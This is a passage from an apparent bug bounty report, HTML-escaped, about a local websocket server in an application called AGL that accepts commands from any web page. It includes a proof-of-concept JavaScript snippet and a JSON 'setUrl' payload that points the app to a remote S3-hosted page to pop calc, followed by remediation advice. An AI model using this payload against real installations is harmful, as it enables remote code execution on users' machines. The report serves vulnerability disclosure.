machine:\n\n\u003col\u003e\n\u003cli\u003ehttps://[redacted].s3.amazonaws.com/agl-poc/calc-ws.html\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eWatch calc pop.\u003c/li\u003e\n\u003cli\u003eOptionally, paste the following command in the text field and press send to see calc pop again.\n\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003e{\u0026quot;command\u0026quot;:\u0026quot;setUrl\u0026quot;,\u0026quot;params\u0026quot;:{\u0026quot;url\u0026quot;:\u0026quot;https://[redacted].s3.us-east-1.amazonaws.com/node.html\u0026quot;},\u0026quot;source\u0026quot;:\u0026quot;QAS\u0026quot;,\u0026quot;target\u0026quot;:\u0026quot;AGL\u0026quot;}\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eYou can also do other fun things like enabling dev tools.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe code in \u003ccode\u003ecalc-ws\u003c/code\u003e is similar to the chat code. After the socket to the local websocket server opens, the payload above is sent. See the modification heres:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ews://localhost:1235/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003esocket\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eWebSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e{\u0026quot;command\u0026quot;:\u0026quot;setUrl\u0026quot;,\u0026quot;params\u0026quot;:{\u0026quot;url\u0026quot;:\u0026quot;https://[redacted].s3.us-east-1.amazonaws.com/node.html\u0026quot;},\u0026quot;source\u0026quot;:\u0026quot;QAS\u0026quot;,\u0026quot;target\u0026quot;:\u0026quot;AGL\u0026quot;}\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// send the payload when the socket is opened.\u003c/span\u003e\n\u003cspan class=\"nx\"\u003esocket\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonopen\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eshowMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ebefore payload\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003esocket\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eshowMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eafter payload\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe following gif shows the whole chain. Again, please see it in full-size.\u003c/p\u003e\n\n\u003cp\u003e{F827148}\u003c/p\u003e\n\n\u003ch3 id=\"bonus-minor-issue-0-websocket-server-listening-on-0-0-0-0\"\u003eBonus: Minor Issue 0: Websocket Server Listening on 0.0.0.0\u003c/h3\u003e\n\n\u003cp\u003eThe application is listening on all interfaces (\u003ccode\u003e0.0.0.0\u003c/code\u003e) which is problematic. This is also not fun because the Windows firewall prompt will pop up when its executed for the first time. Meaning anyone who can contact this port \u003cstrong\u003emight\u003c/strong\u003e be able to send commands to this websocket server.\u003c/p\u003e\n\n\u003ch2 id=\"remediation-or-how-can-we-fix-this\"\u003eRemediation or How Can We Fix This?\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eQuick and effective win: The local websocket server should validate the \u003ccode\u003eOrigin\u003c/code\u003e header of the incoming request and only allow requests from good Origins specified in a list.\n\n\u003cul\u003e\n\u003cli\u003eThis is the same recommendation by TavisO in \u003ca title=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1663\" href=\"/redirect?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D1663\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.chromium.org/p/project-zero/issues/detail?id=1663\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. And he is much smarter than I will ever be.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eBonus win: Do not listen on all interfaces, bind the server to \u003ccode\u003elocalhost\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAttackers can run code on users\u0026#39; machines. They can get to the other side of the airtight hatchway.\u003c/p\u003e\n"}]}